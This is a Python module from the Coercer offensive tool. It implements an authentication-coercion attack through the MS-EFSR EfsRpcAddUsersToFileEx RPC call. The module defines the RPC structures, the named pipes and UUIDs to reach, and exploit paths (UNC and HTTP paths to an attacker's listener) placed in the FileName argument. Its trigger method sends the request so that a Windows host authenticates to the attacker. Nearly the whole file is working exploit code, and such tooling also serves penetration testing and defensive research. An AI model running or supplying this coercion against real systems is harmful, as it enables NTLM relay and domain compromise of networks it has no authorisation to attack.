#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : EfsRpcAddUsersToFileEx.py
# Author             : Podalirius (@podalirius_)
# Fixed by           : XiaoliChan
# Date created       : 16 Sep 2022
# Updated in         : 18 Mar 2023


from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
from coercer.network.DCERPCSessionError import DCERPCSessionError
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID, NDRPOINTERNULL

class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )

class EFS_HASH_BLOB(NDRSTRUCT):
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )

class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_HASH_BLOB),
        ('Display', LPWSTR),
    ) 

class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    structure = (
        ('nUsers', DWORD),
        ('Users', ENCRYPTION_CERTIFICATE_HASH),
    )


class _EfsRpcAddUsersToFileEx(NDRCALL):
    opnum = 15
    structure = (
        ('dwFlags', DWORD),    # Type: DWORD
        # Accroding to this page: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d36df703-edc9-4482-87b7-d05c7783d65e
        # Reserved must be set to NULL 
        ('Reserved', NDRPOINTERNULL),   # Type: NDRPOINTERNULL *
        ('FileName', WSTR),    # Type: wchar_t *
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),  # Type: ENCRYPTION_CERTIFICATE_LIST *
    )


class _EfsRpcAddUsersToFileExResponse(NDRCALL):
    structure = ()


class EfsRpcAddUsersToFileEx(MSPROTOCOLRPCCALL):
    """
    
    
    https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d36df703-edc9-4482-87b7-d05c7783d65e
    """

    exploit_paths = [
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
        ("http", '\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\share\\file.txt\x00'),
    ]

    access = {
        "ncan_np": [
            {
                "namedpipe": r"\PIPE\efsrpc",
                "uuid": "df1941c5-fe89-4e79-bf10-463657acf44d",
                "version": "1.0"
            },
            {
                "namedpipe": r"\PIPE\lsarpc",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0"
            },
            {
                "namedpipe": r"\PIPE\samr",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0"
            },
            {
                "namedpipe": r"\PIPE\lsass",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0"
            },
            {
                "namedpipe": r"\PIPE\netlogon",
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0"
            },
        ],
        "ncacn_ip_tcp": [
            {
                "uuid": "df1941c5-fe89-4e79-bf10-463657acf44d",
                "version": "1.0"
            },
            {
                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
                "version": "1.0"
            }
        ]
    }

    protocol = {
        "longname": "[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol",
        "shortname": "MS-EFSR"
    }

    function = {
        "name": "EfsRpcAddUsersToFileEx",
        "opnum": 15,
        "vulnerable_arguments": ["FileName"]
    }

    def trigger(self, dcerpc_session, target):
        if dcerpc_session is not None:
            try:
                request = _EfsRpcAddUsersToFileEx()
                # dwFlags: This MUST be set to a bitwise OR of 0 or more of the following flags.
                # The descriptions of the flags are specified in the following table.
                # If the EFSRPC_ADDUSERFLAG_REPLACE_DDF flag is used, then the EncryptionCertificates
                # parameter MUST contain exactly one certificate.
                # EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE don't need to supply certificate
                EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE = 0x00000002
                EFSRPC_ADDUSERFLAG_REPLACE_DDF = 0x00000004
                request['dwFlags'] = EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE
                request['FileName'] = self.path
                resp = dcerpc_session.request(request)
                return ""
            except Exception as err:
                return err
        else:
            print("[!] Error: dce is None, you must call connect() first.")
            return None
